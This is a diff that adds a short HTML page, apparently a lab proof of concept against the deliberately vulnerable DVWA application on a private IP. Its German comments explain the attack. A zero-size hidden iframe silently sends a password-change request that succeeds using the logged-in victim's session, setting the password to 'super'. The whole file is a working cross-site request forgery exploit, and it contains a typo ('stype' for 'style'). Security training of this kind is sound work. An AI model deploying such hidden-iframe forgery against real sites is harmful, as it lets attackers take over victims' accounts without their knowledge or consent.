@@ -1,0 +1,14 @@
+<html>
+  <head>
+    <title>Super Website</title>
+  </head>
+  <body>
+    <h1> Das ist eine super Webseite!
+      <!--
+      Der folgende iFrame ist nicht sichtbar auf der Website. 
+      Der iFrame ruft im Hintergrund die URL für den Passwortwechsel auf.
+      Der Passwortwechsel gelingt, wenn der Nutzer eingeloggt ist und so seine Session ID übernommen wird.
+      -->
+      <iframe stype="display:none" src="http://192.168.0.11/dvwa/vulnerabilities/csrf/?password_new=super&password_conf=super&Change=Change" width="0" height="0"></iframe>
+    </body>
+</html>
